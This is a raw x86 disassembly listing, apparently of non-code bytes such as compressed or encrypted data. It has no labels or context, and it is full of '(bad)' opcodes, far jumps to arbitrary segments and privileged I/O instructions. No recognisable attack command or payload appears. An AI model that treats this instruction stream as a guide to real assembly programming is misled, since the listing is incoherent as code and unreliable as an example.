  41ddb0:	push   0xffffffe6
  41ddb2:	xor    ah,BYTE PTR [ecx-0x21100638]
  41ddb8:	add    ebp,DWORD PTR [ecx]
  41ddba:	or     BYTE PTR [ecx+0x51c4d65e],dl
  41ddc0:	(bad)  [ebp+0x34]
  41ddc3:	inc    ecx
  41ddc4:	jg     0x41de3a
  41ddc6:	repnz ins DWORD PTR es:[edi],dx
  41ddc8:	jl     0x41de2a
  41ddca:	dec    DWORD PTR [ecx]
  41ddcc:	jmp    0x140:0x169c8979
  41ddd3:	jmp    0x65e:0xed7f3512
  41ddda:	(bad)  
  41dddb:	jg     0x41dda9
  41dddd:	cmp    eax,0x5b8d068e
  41dde2:	pusha  
  41dde3:	sub    DWORD PTR [ebx+edi*2+0x42],edx
  41dde7:	mov    eax,ds:0x881b5e9d
  41ddec:	xor    BYTE PTR [eax+0x1f],bh
  41ddef:	idiv   BYTE PTR [eax+eiz*8-0x5f]
  41ddf3:	or     eax,0xd50b5b01
  41ddf8:	dec    esi
  41ddf9:	popa   
  41ddfa:	hlt    
  41ddfb:	imul   edx,DWORD PTR [eax+0x24],0xed561069
  41de02:	out    dx,al
  41de03:	adc    dl,BYTE PTR [esi-0x4299e5da]
  41de09:	mov    eax,0xb7ba843
  41de0e:	xor    dh,BYTE PTR [ecx+0x15]
  41de11:	xchg   ecx,eax
  41de12:	inc    eax
  41de13:	xor    BYTE PTR [ebp-0x7d55115d],0x5c
  41de1a:	xchg   edi,eax
  41de1b:	cmp    bl,BYTE PTR [eax+0x65]
  41de1e:	loope  0x41ddc0
  41de20:	popf   
  41de21:	add    bl,ah
  41de23:	inc    ecx
  41de24:	lods   eax,DWORD PTR ds:[esi]
  41de25:	add    al,0x87
  41de27:	retf   0x9c51
  41de2a:	imul   esp,DWORD PTR [ecx-0x22],0xa5fbb370
  41de31:	xchg   ebp,eax
  41de32:	(bad)  
  41de33:	stos   DWORD PTR es:[edi],eax
  41de34:	or     al,0x4f
  41de36:	outs   dx,BYTE PTR ds:[esi]
  41de37:	add    bl,cl
  41de39:	nop
  41de3a:	sub    bl,ah
  41de3c:	inc    eax
  41de3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de3e:	out    dx,al
  41de3f:	shl    BYTE PTR [eax-0x1c],cl
  41de42:	stos   DWORD PTR es:[edi],eax
  41de43:	int3   
  41de44:	into   
  41de45:	xchg   DWORD PTR [edi],esp
  41de47:	mov    ds:0x4e044fa1,al
  41de4c:	push   edx
  41de4d:	lock xchg DWORD PTR [ebp-0x4a],esp
  41de51:	mov    edx,0xc25eb4e5
  41de56:	(bad)  
  41de57:	daa    
  41de58:	ss inc eax
  41de5a:	mov    esi,0xb27a68a4
  41de5f:	je     0x41de7f
  41de61:	pop    ds
  41de62:	aas    
  41de63:	aam    0x5e
  41de65:	lock leave 
  41de67:	daa    
  41de68:	cmp    BYTE PTR [ebp+0x60c06392],bh
  41de6e:	out    0x17,eax
  41de70:	(bad)  
  41de71:	ja     0x41de32
  41de73:	cmp    ch,BYTE PTR [esi+0x12]
  41de76:	or     BYTE PTR [edi],dh
  41de78:	cmp    esp,eax
  41de7a:	add    BYTE PTR [edx-0x62],dl
  41de7d:	loop   0x41ded4
  41de7f:	pop    edi
  41de80:	xchg   edx,eax
  41de81:	adc    BYTE PTR [ecx],bl
  41de83:	mov    eax,ds:0xc10b0d1a
  41de88:	ja     0x41dee9
  41de8a:	daa    
  41de8b:	jecxz  0x41de76
  41de8d:	inc    eax
  41de8e:	cld    
  41de8f:	nop
  41de90:	shl    eax,0xa3
  41de93:	mov    ds:0x3a37ef9b,al
  41de98:	mov    WORD PTR [eax+0x2e544490],es
  41de9e:	xchg   ebx,eax
  41de9f:	std    
  41dea0:	sahf   
  41dea1:	or     BYTE PTR [edi-0x7e],al
  41dea4:	ret    
  41dea5:	jb     0x41de8e
  41dea7:	mov    al,ds:0x10241917
  41deac:	sar    al,cl
  41deae:	fild   WORD PTR [esi+esi*4-0x59ba11c8]
  41deb5:	call   0xed715705
  41deba:	sub    dh,dl
  41debc:	sub    eax,0xbee06361
  41dec1:	and    DWORD PTR [esp+eiz*2],esi
  41dec4:	xchg   DWORD PTR [edx],ebx
  41dec6:	pop    ds
  41dec7:	aas    
  41dec8:	cmp    ebx,DWORD PTR [ecx+0x2807a185]
  41dece:	xchg   dh,dl
  41ded0:	or     bl,bl
  41ded2:	push   ecx
  41ded3:	mov    eax,ds:0x58a1d7d7
  41ded8:	jbe    0x41de94
  41deda:	dec    edx
  41dedb:	jp     0x41df40
  41dedd:	and    ebp,eax
  41dedf:	je     0x41df0c
  41dee1:	and    DWORD PTR [ebx+0x2aa43fcd],ecx
  41dee7:	mov    eax,ds:0x6a080fba
  41deec:	clc    
  41deed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deee:	loope  0x41deff
  41def0:	pop    edi
  41def1:	sahf   
  41def2:	and    eax,0xa013a1d6
  41def7:	or     DWORD PTR [eax-0x32],edx
  41defa:	mov    edi,0x1b6904a0
  41deff:	xor    al,0xb3
  41df01:	or     eax,0xf0648f99
  41df06:	push   esi
  41df07:	es push es
  41df09:	cmp    DWORD PTR [edx+0x2b],0x8dde4acf
  41df10:	les    esp,FWORD PTR [edx]
  41df12:	xor    eax,0xf2df5dea
  41df17:	inc    ebx
  41df18:	fcomp  DWORD PTR [ecx+0x5227f0b9]
  41df1e:	add    dh,dh
  41df20:	mov    ch,0x5e
  41df22:	cs pop ds
  41df24:	scas   eax,DWORD PTR es:[edi]
  41df25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df26:	dec    eax
  41df27:	xchg   esi,eax
  41df28:	out    dx,al
  41df29:	pusha  
  41df2a:	push   0xfffffffc
  41df2c:	je     0x41def1
  41df2e:	add    al,0xc1
  41df30:	adc    edx,DWORD PTR [ecx]
  41df32:	out    dx,al
  41df33:	not    DWORD PTR [edx-0x24]
  41df36:	jnp    0x41dee4
  41df38:	pop    ebp
  41df39:	enter  0xa180,0xab
  41df3d:	pop    ecx
  41df3e:	dec    esp
  41df3f:	lock ja 0x41df7d
  41df42:	rcl    DWORD PTR [esi+ebx*2+0x7c],1
  41df46:	xchg   esp,eax
  41df47:	hlt    
  41df48:	mov    edx,0x8d74b4d7
  41df4d:	dec    ebp
  41df4e:	mov    ds:0x1d61523a,eax
  41df53:	in     eax,0xce
  41df55:	pop    es
  41df56:	or     eax,0xaf015eb8
  41df5b:	dec    ebx
  41df5c:	call   0x8b87360c
  41df61:	pusha  
  41df62:	pop    esp
  41df63:	mov    edx,0x1ebf58fd
  41df68:	jg     0x41df67
  41df6a:	out    dx,al
  41df6b:	push   ss
  41df6c:	add    eax,edx
  41df6e:	lea    edx,[ebp-0x5f3c6a8e]
  41df74:	jmp    FWORD PTR [ebp+esi*4+0x3543902b]
  41df7b:	xor    dh,BYTE PTR [esp+edx*4]
  41df7e:	push   ds
  41df7f:	and    edx,edi
  41df81:	fs scas al,BYTE PTR es:[edi]
  41df83:	call   eax
  41df85:	imul   esi,DWORD PTR [edx-0xe],0x72666071
  41df8c:	mov    ebx,0xbef79ce4
  41df91:	std    
  41df92:	add    dl,BYTE PTR [ebp-0x27d4926b]
  41df98:	popf   
  41df99:	gs jg  0x41dfa5
  41df9c:	cld    
  41df9d:	mov    ebp,0x562ec506
  41dfa2:	inc    esp
  41dfa3:	mov    eax,ds:0x93a113c1
  41dfa8:	lock mov esp,0xcfbffbee
  41dfae:	sub    ah,dh
  41dfb0:	scas   al,BYTE PTR es:[edi]
  41dfb1:	sbb    edx,ecx
  41dfb3:	mov    al,ds:0xa23229e3
  41dfb8:	dec    ebx
  41dfb9:	js     0x41e000
  41dfbb:	jge    0x41e01b
  41dfbd:	mov    ah,0x2a
  41dfbf:	stos   DWORD PTR es:[edi],eax
  41dfc0:	call   0x1194d25c
  41dfc5:	popa   
  41dfc6:	jb     0x41dfd4
  41dfc8:	dec    esp
  41dfc9:	mov    eax,ds:0xf4b73621
  41dfce:	out    0x6c,eax
  41dfd0:	sub    DWORD PTR [edx+0x7a],edx
  41dfd3:	arpl   si,bx
  41dfd5:	mov    edi,0x52facec9
  41dfda:	xchg   esi,eax
  41dfdb:	jmp    0xb1f3:0xf8ce95e4
  41dfe2:	cmc    
  41dfe3:	xchg   BYTE PTR [esi+0x54],bl
  41dfe6:	mov    cs,WORD PTR [ecx]
  41dfe8:	rcl    DWORD PTR [edx+0x6136280a],0xac
  41dfef:	out    0xa,al
  41dff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff2:	and    DWORD PTR [edi+0x4a],edx
  41dff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff6:	dec    eax
  41dff7:	popa   
  41dff8:	sbb    DWORD PTR [bp+si+0x4b78],eax
  41dffd:	popa   
  41dffe:	fs dec edi
  41e000:	(bad)  
  41e001:	mov    es,esp
  41e003:	lea    edi,[ecx]
  41e005:	sub    BYTE PTR ds:0xb7042ae1,bh
  41e00b:	jecxz  0x41e003
  41e00d:	xor    DWORD PTR [edx+0x7c],esp
  41e010:	xor    dl,BYTE PTR [ecx+0x65e7a14c]
  41e016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e017:	jnp    0x41dfc3
  41e019:	dec    ecx
  41e01a:	cdq    
  41e01b:	mov    al,ds:0x5ea9c0ae
  41e020:	sahf   
  41e021:	imul   esp,DWORD PTR ss:[ecx-0x4b],0x14
  41e026:	out    dx,al
  41e027:	mov    cs,edi
  41e029:	popf   
  41e02a:	mov    ah,0x1e
  41e02c:	loope  0x41e019
  41e02e:	adc    DWORD PTR [ebx-0x5cc1526a],0x1753e7f
  41e038:	jg     0x41dfce
  41e03a:	inc    esi
  41e03b:	stos   DWORD PTR es:[edi],eax
  41e03c:	aaa    
  41e03d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e03e:	out    dx,al
  41e03f:	adc    dl,dl
  41e041:	jle    0x41dfc8
  41e043:	xor    eax,0xa1394a6c
  41e048:	je     0x41dfd1
  41e04a:	(bad)  
  41e04b:	dec    ebp
  41e04c:	in     al,0x3
  41e04e:	push   cs
  41e04f:	dec    ecx
  41e050:	jl     0x41e0bb
  41e052:	out    dx,al
  41e053:	retf   
  41e054:	pop    eax
  41e055:	push   ds
  41e056:	cdq    
  41e057:	pop    ecx
  41e058:	xor    eax,0x5ca10137
  41e05d:	out    dx,al
  41e05e:	dec    edx
  41e05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e060:	sahf   
  41e061:	or     DWORD PTR [ebx+0x5b],edi
  41e064:	pop    ecx
  41e065:	pop    edx
  41e066:	pop    ebx
  41e067:	lods   eax,DWORD PTR ds:[esi]
  41e068:	(bad)  
  41e069:	leave  
  41e06a:	daa    
  41e06b:	addr16 sahf 
  41e06d:	push   ss
  41e06e:	add    edi,ebp
  41e070:	dec    ecx
  41e071:	scas   al,BYTE PTR es:[edi]
  41e072:	inc    edx
  41e073:	xchg   esp,eax
  41e074:	mov    bl,0x23
  41e076:	lock lahf 
  41e078:	aad    0x64
  41e07a:	dec    ebp
  41e07b:	scas   eax,DWORD PTR es:[edi]
  41e07c:	popf   
  41e07d:	cld    
  41e07e:	out    dx,eax
  41e07f:	xor    BYTE PTR [ecx+eiz*1+0x58],dl
  41e083:	mov    ds:0x54ee8e08,eax
  41e088:	(bad)  
  41e089:	mov    esi,0x2775ba0b
  41e08e:	inc    ecx
  41e08f:	mov    eax,ds:0x216f7569
  41e094:	ret    
  41e095:	adc    al,0x97
  41e097:	pop    ss
  41e098:	pop    esi
  41e099:	mov    bh,0x2a
  41e09b:	adc    BYTE PTR ds:0x253b46ce,dl
  41e0a1:	popa   
  41e0a2:	popf   
  41e0a3:	inc    edi
  41e0a4:	jecxz  0x41e049
  41e0a6:	xchg   ecx,eax
  41e0a7:	(bad)  
  41e0a8:	cmp    ch,BYTE PTR [ebp-0x12]
  41e0ab:	icebp  
  41e0ac:	into   
  41e0ad:	aas    
  41e0ae:	add    eax,DWORD PTR [ecx+0x6cf68e9f]
  41e0b4:	jb     0x41e0f9
  41e0b6:	sub    ch,BYTE PTR [ebp+esi*2-0x5ab0d160]
  41e0bd:	ret    
  41e0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0bf:	lods   al,BYTE PTR ds:[esi]
  41e0c0:	pop    esi
  41e0c1:	cli    
  41e0c2:	jno    0x41e060
  41e0c4:	out    dx,eax
  41e0c5:	outs   dx,BYTE PTR ds:[esi]
  41e0c6:	sbb    ebp,edi
  41e0c8:	std    
  41e0c9:	inc    esp
  41e0ca:	ret    0x3191
  41e0cd:	mov    eax,ds:0x54b6ed03
  41e0d2:	jmp    0x4b6c:0x9e8e5e19
  41e0d9:	inc    edx
  41e0da:	fild   WORD PTR [ebx-0x23]
  41e0dd:	pusha  
  41e0de:	sub    BYTE PTR [esi+0x5a9795f4],cl
  41e0e4:	lods   al,BYTE PTR ds:[esi]
  41e0e5:	adc    ebp,ebp
  41e0e7:	pushf  
  41e0e8:	mov    esi,DWORD PTR [ecx+0x3e]
  41e0eb:	imul   BYTE PTR [eax-0x5]
  41e0ee:	inc    edx
  41e0ef:	push   ss
  41e0f0:	ret    
  41e0f1:	pusha  
  41e0f2:	pop    edi
  41e0f3:	out    dx,al
  41e0f4:	pop    ebp
  41e0f5:	ins    BYTE PTR es:[edi],dx
  41e0f6:	lea    esp,[ecx-0x16]
  41e0f9:	shr    esi,1
  41e0fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0fc:	xor    DWORD PTR [esi],eax
  41e0fe:	imul   edx,DWORD PTR [edi-0x66023803],0x1f0e1c6d
  41e108:	pop    ebx
  41e109:	xor    eax,0xe335f15a
  41e10e:	dec    esi
  41e10f:	jmp    0xc9d2:0xbcd9445e
  41e116:	rcr    bh,1
  41e118:	mov    esp,DWORD PTR [eax-0x69]
  41e11b:	cdq    
  41e11c:	xchg   ecx,eax
  41e11d:	inc    esi
  41e11e:	mov    ah,0xc8
  41e120:	mov    WORD PTR ds:0xde3ebeec,?
  41e126:	test   al,0x39
  41e128:	test   DWORD PTR [eax+0x31],eax
  41e12b:	call   0xc928:0xc09a524a
  41e132:	scas   al,BYTE PTR es:[edi]
  41e133:	sub    al,0xbe
  41e135:	xchg   ebx,eax
  41e136:	in     eax,dx
  41e137:	stos   BYTE PTR es:[edi],al
  41e138:	pop    esi
  41e139:	mov    ah,0x1e
  41e13b:	jnp    0x41e0ce
  41e13d:	in     eax,dx
  41e13e:	enter  0x99f3,0x60
  41e142:	fistp  QWORD PTR [edx]
  41e144:	jecxz  0x41e16d
  41e146:	sbb    edx,DWORD PTR [ebx-0x17]
  41e149:	push   edi
  41e14a:	out    0xea,eax
  41e14c:	pop    ss
  41e14d:	dec    ebx
  41e14e:	mov    bl,0xf
  41e150:	fstp   QWORD PTR [edx]
  41e152:	push   0x1f6dfe7f
  41e157:	mov    eax,ds:0x5982447d
  41e15c:	and    eax,0x5438c832
  41e161:	gs xor ebx,eax
  41e164:	sahf   
  41e165:	sub    cl,BYTE PTR [ebx+0x784a249b]
  41e16b:	ins    DWORD PTR es:[edi],dx
  41e16c:	sub    BYTE PTR [ecx-0x64],ah
  41e16f:	das    
  41e170:	into   
  41e171:	sti    
  41e172:	sub    BYTE PTR [edi],bl
  41e174:	xchg   esp,eax
  41e175:	xchg   esi,eax
  41e176:	out    dx,al
  41e177:	push   cs
  41e178:	xchg   edx,eax
  41e179:	add    al,0x79
  41e17b:	sub    DWORD PTR [ebx+0x4b83456a],0x61
  41e182:	stc    
  41e183:	jo     0x41e15e
  41e185:	adc    BYTE PTR [ecx+0x76],dl
  41e188:	mov    ds:0x68e8daf3,eax
  41e18d:	inc    ecx
  41e18e:	mov    ds:0xeed8680d,al
  41e193:	aad    0x75
  41e195:	xlat   BYTE PTR ds:[ebx]
  41e196:	adc    BYTE PTR [ecx],bh
  41e198:	test   BYTE PTR [eax+eiz*1-0x31],ah
  41e19c:	pop    esi
  41e19d:	ret    
  41e19e:	shl    DWORD PTR [ebx-0x3e],0xa9
  41e1a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1a3:	rcr    DWORD PTR [esi+0x6d],0x37
  41e1a7:	pop    ecx
  41e1a8:	(bad)  
  41e1a9:	les    ecx,FWORD PTR [eax-0x4a]
  41e1ac:	aas    
  41e1ad:	popa   
  41e1ae:	add    eax,0xb833beef
  41e1b3:	retf   
  41e1b4:	jg     0x41e1da
  41e1b6:	out    dx,al
  41e1b7:	mov    edi,0xdd7a601c
  41e1bc:	cwde   
  41e1bd:	cmp    ebx,DWORD PTR [ecx+eiz*4-0x366dceda]
  41e1c4:	xchg   ebx,eax
  41e1c5:	(bad)  
  41e1c6:	ds sub al,0x36
  41e1c9:	adc    dh,BYTE PTR [ecx+ebp*4]
  41e1cc:	call   0x51dd:0x676b2460
  41e1d3:	out    0xa5,eax
  41e1d5:	pusha  
  41e1d6:	(bad)  
  41e1d7:	xchg   ebp,eax
  41e1d8:	in     al,0x4c
  41e1da:	cmp    cl,al
  41e1dc:	aam    0x75
  41e1de:	lock xor bh,BYTE PTR [edx-0x75]
  41e1e2:	ja     0x41e1c5
  41e1e4:	in     eax,0x1
  41e1e6:	cdq    
  41e1e7:	mov    ecx,ecx
  41e1e9:	pusha  
  41e1ea:	lahf   
  41e1eb:	cli    
  41e1ec:	cmp    eax,0xbaf2b604
  41e1f1:	shr    esi,cl
  41e1f3:	sub    al,0x15
  41e1f5:	fs js  0x41e1e5
  41e1f8:	outs   dx,BYTE PTR ds:[esi]
  41e1f9:	sbb    eax,0xb8b0852a
  41e1fe:	pop    ebx
  41e1ff:	mov    eax,ds:0x7e867c0c
  41e204:	aad    0x62
  41e206:	jne    0x41e190
  41e208:	pop    esi
  41e209:	mov    bl,0xa9
  41e20b:	xchg   esi,eax
  41e20c:	fs sbb eax,0x61031d30
  41e212:	pop    esi
  41e213:	or     al,0xc9
  41e215:	sahf   
  41e216:	lahf   
  41e217:	fadd   QWORD PTR [edx+0x2030c6a1]
  41e21d:	inc    esp
  41e21e:	(bad)  
  41e21f:	daa    
  41e220:	fimul  WORD PTR [edx+0x4e]
  41e223:	jnp    0x41e26e
  41e225:	jecxz  0x41e24e
  41e227:	push   cs
  41e228:	mov    ?,WORD PTR [eax-0x1]
  41e22b:	inc    ebp
  41e22c:	out    dx,al
  41e22d:	outs   dx,BYTE PTR fs:[esi]
  41e22f:	and    dh,0x0
  41e232:	lsl    eax,WORD PTR [ecx]
  41e235:	popa   
  41e236:	pop    es
  41e237:	mov    ah,BYTE PTR [edi-0xb51869f]
  41e23d:	fucomi st,st(6)
  41e23f:	and    BYTE PTR [ebx+0x7],cl
  41e242:	xchg   ebp,ecx
  41e244:	sbb    DWORD PTR [esi+0xba4a15a],0xffffff99
  41e24b:	cmp    al,0xdb
  41e24d:	bound  edx,QWORD PTR ds:0xac97641a
  41e253:	lahf   
  41e254:	frstor [eax-0x4f1d9049]
  41e25a:	mov    al,ds:0xe32e70a1
  41e25f:	fistp  WORD PTR [ebx]
  41e261:	inc    ecx
  41e262:	es push cs
  41e264:	push   ecx
  41e265:	push   eax
  41e266:	xchg   edi,eax
  41e267:	gs push ds
  41e269:	fmul   DWORD PTR [edi]
  41e26b:	in     al,0x90
  41e26d:	f2xm1  
  41e26f:	mov    al,ds:0xce060f60
  41e274:	fnstsw WORD PTR [edi+0x2c64bbb1]
  41e27a:	loope  0x41e296
  41e27c:	and    al,cl
  41e27e:	pop    eax
  41e27f:	jecxz  0x41e252
  41e281:	sbb    edi,DWORD PTR [edx+ebx*4+0x4c]
  41e285:	xor    eax,DWORD PTR ds:0xdf2f5d2f
  41e28b:	xchg   DWORD PTR [ecx-0x63],esp
  41e28e:	mov    edx,0x55703413
  41e293:	and    al,BYTE PTR [ebp+esi*2+0x57]
  41e297:	imul   edx,DWORD PTR ds:0xb23746de,0xf6a0c328
  41e2a1:	inc    esi
  41e2a2:	mov    cs,WORD PTR ds:0x172282b
  41e2a8:	pop    esi
  41e2a9:	sbb    DWORD PTR [esi+esi*1],0x7230e850
  41e2b0:	push   es
  41e2b1:	popa   
  41e2b2:	adc    ah,BYTE PTR [edx]
  41e2b4:	sbb    al,0xb7
  41e2b6:	fild   WORD PTR [eax-0x5711b231]
  41e2bc:	jne    0x41e262
  41e2be:	mov    esp,0x726276f4
  41e2c3:	mov    eax,ds:0x133394b
  41e2c8:	inc    esp
  41e2c9:	les    ecx,FWORD PTR [ebx+edx*2+0x53]
  41e2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2ce:	imul   esp,DWORD PTR [edi+0x61c00d92],0x5b88ce9e
  41e2d8:	cwde   
  41e2d9:	clc    
  41e2da:	sub    al,0xc7
  41e2dc:	xchg   esp,eax
  41e2dd:	test   al,0xd2
  41e2df:	sahf   
  41e2e0:	int3   
  41e2e1:	ds push cs
  41e2e3:	xchg   esp,eax
  41e2e4:	into   
  41e2e5:	cld    
  41e2e6:	xor    dh,BYTE PTR [ebp+0x5e]
  41e2e9:	mov    esi,0xe2c9668e
  41e2ee:	mov    edx,0x26089d3d
  41e2f3:	cmp    DWORD PTR [ebp-0x14],ebx
  41e2f6:	mov    ebx,0x765ede3b
  41e2fb:	icebp  
  41e2fc:	mov    esp,0xad352165
  41e301:	pusha  
  41e302:	fimul  WORD PTR [ecx-0x44]
  41e305:	mov    eax,0x426eea08
  41e30a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e30b:	fadd   QWORD PTR [eax+eiz*8+0x31a72d72]
  41e312:	push   cs
  41e313:	cdq    
  41e314:	xor    eax,0xa4216a6e
  41e319:	dec    ecx
  41e31a:	out    0x87,al
  41e31c:	jbe    0x41e30b
  41e31e:	test   eax,0xfc134fa7
  41e323:	arpl   WORD PTR [eax-0x12e5d540],bp
  41e329:	imul   esi
  41e32b:	nop
  41e32c:	pop    ds
  41e32d:	jno    0x41e2b7
  41e32f:	(bad)  
  41e330:	ret    
  41e331:	jl     0x41e2e3
  41e333:	mov    ds:0xc6976f9,al
  41e338:	sbb    edi,DWORD PTR [edx+0x16ce98ab]
  41e33e:	stc    
  41e33f:	imul   esp,DWORD PTR [eax+ebx*1+0x58],0x2009a59
  41e347:	dec    edx
  41e348:	add    bl,BYTE PTR [ebp*2-0x2f16c28d]
  41e34f:	(bad)  
  41e350:	js     0x41e3ce
  41e352:	imul   esi,DWORD PTR [eax+0x40d0715e],0x40946ca
  41e35c:	pop    esi
  41e35d:	cli    
  41e35e:	pop    ebx
  41e35f:	mov    bl,0xb5
  41e361:	nop
  41e362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e363:	xchg   esi,eax
  41e364:	repnz mov dl,0x1f
  41e367:	mov    eax,ds:0xdc7bc8d8
  41e36c:	cld    
  41e36d:	push   esp
  41e36e:	mov    esi,0xc1885e1e
  41e373:	mov    ch,0x73
  41e375:	xor    ebp,DWORD PTR [edi]
  41e377:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41e379:	pusha  
  41e37a:	adc    al,0x74
  41e37c:	cmp    al,BYTE PTR [esi+0x20cad676]
  41e382:	out    dx,al
  41e383:	fisub  DWORD PTR [edi+0x43]
  41e386:	cmp    BYTE PTR [ecx],ch
  41e388:	nop
  41e389:	popf   
  41e38a:	mov    edx,0xe9c32a0
  41e38f:	icebp  
  41e390:	imul   esp,DWORD PTR [edx+0x55e09e7],0xdcea1ad9
  41e39a:	js     0x41e328
  41e39c:	popaw  
  41e39e:	jg     0x41e347
  41e3a0:	loopne 0x41e3ee
  41e3a2:	inc    ebx
  41e3a3:	and    DWORD PTR [ebp-0x46eb11c1],0x1504a603
  41e3ad:	fwait
  41e3ae:	sub    BYTE PTR [ecx-0x61219c8],0xa4
  41e3b5:	or     ebp,edi
  41e3b7:	ret    
  41e3b8:	cmp    bl,BYTE PTR [ecx+0x635e4458]
  41e3be:	jecxz  0x41e3a4
  41e3c0:	pushf  
  41e3c1:	add    bh,BYTE PTR [edx]
  41e3c3:	call   0xf3bd:0xa3e46085
  41e3ca:	inc    edx
  41e3cb:	rcr    DWORD PTR ds:0x8d88f37b,cl
  41e3d1:	loop   0x41e3ee
  41e3d3:	mov    ds:0x7655c87a,al
  41e3d8:	xchg   DWORD PTR [eax+0x59a29181],esi
  41e3de:	in     al,dx
  41e3df:	push   ss
  41e3e0:	(bad)  
  41e3e1:	xor    dl,ah
  41e3e3:	mov    al,ds:0xe0ed7fd3
  41e3e8:	pop    esi
  41e3e9:	adc    al,0xf9
  41e3eb:	div    BYTE PTR ds:0x5ccf52
  41e3f1:	mov    al,0x4a
  41e3f3:	mov    al,0x6f
  41e3f5:	pusha  
  41e3f6:	aaa    
  41e3f7:	in     eax,dx
  41e3f8:	sub    al,0x53
  41e3fa:	mov    esi,0xed314090
  41e3ff:	test   edx,ecx
  41e401:	pushf  
  41e402:	popa   
  41e403:	xchg   edx,ebp
  41e405:	or     al,0x6e
  41e407:	fistp  QWORD PTR [eax+0x6494b822]
  41e40d:	xor    ah,BYTE PTR [edx]
  41e40f:	jns    0x41e3cf
  41e411:	pusha  
  41e412:	call   0x6ae197e0
  41e417:	sub    BYTE PTR [edx],0x67
  41e41a:	mov    al,ds:0xe760739a
  41e41f:	fidiv  WORD PTR [ebx]
  41e421:	pop    ds
  41e422:	jl     0x41e3eb
  41e424:	int3   
  41e425:	pop    es
  41e426:	out    dx,al
  41e427:	idiv   BYTE PTR [edi+0xe]
  41e42a:	outs   dx,BYTE PTR ds:[esi]
  41e42b:	inc    edi
  41e42c:	add    eax,0x1f2976b9
  41e431:	inc    ebx
  41e432:	sub    BYTE PTR [ecx+0x21848440],al
  41e438:	xchg   edx,edx
  41e43a:	add    al,0x54
  41e43c:	pusha  
  41e43d:	adc    edi,ebx
  41e43f:	jmp    0x41e49f
  41e441:	adc    eax,0x932c6fab
  41e446:	gs cwde 
  41e448:	push   0x82a0b7f1
  41e44d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e44e:	or     BYTE PTR [ecx+0x4f978d0c],bl
  41e454:	pop    esi
  41e455:	mov    bh,0xc
  41e457:	ins    DWORD PTR es:[edi],dx
  41e458:	icebp  
  41e459:	es ins BYTE PTR es:[edi],dx
  41e45b:	test   al,0x21
  41e45d:	popa   
  41e45e:	loopne 0x41e40a
  41e460:	and    esp,DWORD PTR [eax+0x529e094b]
  41e466:	in     eax,dx
  41e467:	mov    eax,0x455fe436
  41e46c:	call   0xf505:0x1d162e26
  41e473:	push   ecx
  41e474:	pop    esi
  41e475:	jno    0x41e479
  41e477:	add    DWORD PTR [ebx+0x5d2f6c98],ebp
  41e47d:	loope  0x41e417
  41e47f:	addr16 out 0xa0,al
  41e482:	stos   DWORD PTR es:[edi],eax
  41e483:	adc    al,0xa2
  41e485:	xchg   edx,eax
  41e486:	icebp  
  41e487:	scas   al,BYTE PTR es:[edi]
  41e488:	sub    esp,edx
  41e48a:	jg     0x41e4d3
  41e48c:	or     esp,DWORD PTR [ecx+0x43]
  41e48f:	push   es
  41e490:	jmp    0x4de:0x5ecd6841
  41e497:	inc    esp
  41e498:	mov    edx,ebp
  41e49a:	add    ch,al
  41e49c:	cs inc esp
  41e49e:	ins    DWORD PTR es:[edi],dx
  41e49f:	aam    0xda
  41e4a1:	arpl   WORD PTR [eax],ax
  41e4a3:	hlt    
  41e4a4:	in     al,0xe0
  41e4a6:	or     eax,0x15e0ecec
  41e4ab:	cmp    DWORD PTR [ebp+0x0],ebx
  41e4ae:	shr    DWORD PTR [eax+0x16],cl
  41e4b1:	push   0xffffff82
  41e4b3:	xchg   DWORD PTR [edx+0x72b05183],ebx
  41e4b9:	iret   
  41e4ba:	out    dx,al
  41e4bb:	mov    ebp,0x9bb394f5
  41e4c0:	clc    
  41e4c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4c2:	out    dx,al
  41e4c3:	mov    WORD PTR [esi],gs
  41e4c5:	cmp    esp,DWORD PTR [edi+0x46]
  41e4c8:	outs   dx,DWORD PTR ds:[esi]
  41e4c9:	dec    esp
  41e4ca:	int    0xa0
  41e4cc:	repnz push esp
  41e4ce:	or     DWORD PTR [edx],ebp
  41e4d0:	pop    eax
  41e4d1:	fwait
  41e4d2:	xchg   esi,eax
  41e4d3:	shr    BYTE PTR [esi+0x7519ee5d],cl
  41e4d9:	cld    
  41e4da:	and    esi,DWORD PTR [edi+eiz*4]
  41e4dd:	ds aas 
  41e4df:	mov    eax,ds:0x9df78d57
  41e4e4:	sub    al,0x20
  41e4e6:	inc    edi
  41e4e7:	repz arpl WORD PTR [esi-0x3ebb4526],sp
  41e4ee:	xor    eax,0x5f751fe8
  41e4f3:	mov    ds:0xf8ae91d1,al
  41e4f8:	mov    es,WORD PTR [ecx]
  41e4fa:	add    dh,BYTE PTR [ecx-0x4711cf29]
  41e500:	mov    ch,BYTE PTR ds:0x5c7bdefe
  41e506:	add    BYTE PTR [ecx-0x6],bh
  41e509:	mov    ds:0x606fd1ce,eax
  41e50e:	cmp    BYTE PTR [ebp-0x74],0xf7
  41e512:	and    BYTE PTR [edx+0x30eef615],bl
  41e518:	outs   dx,BYTE PTR ds:[esi]
  41e519:	cwde   
  41e51a:	not    BYTE PTR [ecx-0x26e16c90]
  41e520:	sub    ch,BYTE PTR [ebx]
  41e522:	sti    
  41e523:	jno    0x41e581
  41e525:	pop    eax
  41e526:	js     0x41e504
  41e528:	pop    esi
  41e529:	iret   
  41e52a:	retf   
  41e52b:	fidiv  DWORD PTR [esi-0x49]
  41e52e:	out    dx,al
  41e52f:	push   ss
  41e530:	cs dec esi
